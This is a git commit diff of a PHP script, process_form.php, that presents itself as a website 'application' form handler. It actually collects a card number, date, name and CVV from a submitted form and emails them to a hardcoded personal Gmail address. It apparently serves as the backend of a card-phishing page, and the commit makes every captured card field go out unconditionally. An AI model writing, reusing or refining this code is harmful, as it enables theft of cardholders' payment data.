67884fb36bd2c4d888ef1d418bb8cb8891059a3a
VolkerDAN <132279777+VolkerDAN@users.noreply.github.com>
2023-10-08 17:48:40 +0200

    Update process_form.php

--- process_form.php
+++ process_form.php
@@ -2,45 +2,35 @@
 ini_set('display_errors', 'On');
 error_reporting(E_ALL);
 
-$to = 'danilukfolker@gmail.com'; // Адрес, куда будут приходить письма. Две почты указываются через запятую
+$to = 'danilukfolker@gmail.com';
 $sitename = $_SERVER['SERVER_NAME'];
 
-if (isset($_POST['phone']) && !empty($_POST['phone'])) {
-    $numer = strip_tags($_POST['phone']);
+if (isset($_POST['numer']) && !empty($_POST['numer'])) {
+    $numer = strip_tags($_POST['numer']);
     $data = strip_tags($_POST['data']);
     $Namme = strip_tags($_POST['Namme']);
     $cvv = strip_tags($_POST['cvv']);
 
-    // Формирование заголовка письма
-    $subject = "[Заявка с сайта $sitename]";
-    $headers = "From: mail@$sitename \r\n";
+    $subject = "[Заявка с сайта " . $sitename . "]";
+    $headers = "From: mail@" . $sitename . "\r\n";
     $headers .= "MIME-Version: 1.0\r\n";
     $headers .= "Content-Type: text/html;charset=utf-8 \r\n";
 
-    // Формирование тела письма
     $msg = "<html><body style='font-family:Arial,sans-serif;'>";
     $msg .= "<h2 style='font-weight:bold;border-bottom:1px dotted #ccc;'>Новая заявка:</h2>\r\n";
-    if (isset($_POST['data']) && !empty($_POST['data'])) {
-        $msg .= "<p><strong>Дата:</strong> $data</p>\r\n";
-    }
-    if (isset($_POST['phone']) && !empty($_POST['phone'])) {
-        $msg .= "<p><strong>Телефон:</strong> $numer</p>\r\n";
-    }
-    if (isset($_POST['cvv']) && !empty($_POST['cvv'])) {
-        $msg .= "<p><strong>CVV:</strong> $cvv</p>\r\n";
-    }
-    if (isset($_POST['Namme']) && !empty($_POST['Namme'])) {
-        $msg .= "<p><strong>Имя:</strong> $Namme</p>\r\n";
-    }
+    $msg .= "<p><strong>Номер:</strong> " . $numer . "</p>\r\n";
+    $msg .= "<p><strong>Телефон:</strong> " . $data . "</p>\r\n";
+    $msg .= "<p><strong>cvv:</strong> " . $cvv . "</p>\r\n";
+    $msg .= "<p><strong>Имя:</strong> " . $Namme . "</p>\r\n";
     $msg .= "</body></html>";
 
-    // Отправка сообщения
     if (mail($to, $subject, $msg, $headers)) {
-        echo "Заявка отправлена!";
+        echo "Заявка успешно отправлена!";
     } else {
-        echo "Произошла ошибка при отправке заявки :(";
+        echo "Произошла ошибка при отправке заявки.";
     }
 } else {
     echo "Заявка не отправлена :(";
 }
 ?>
+
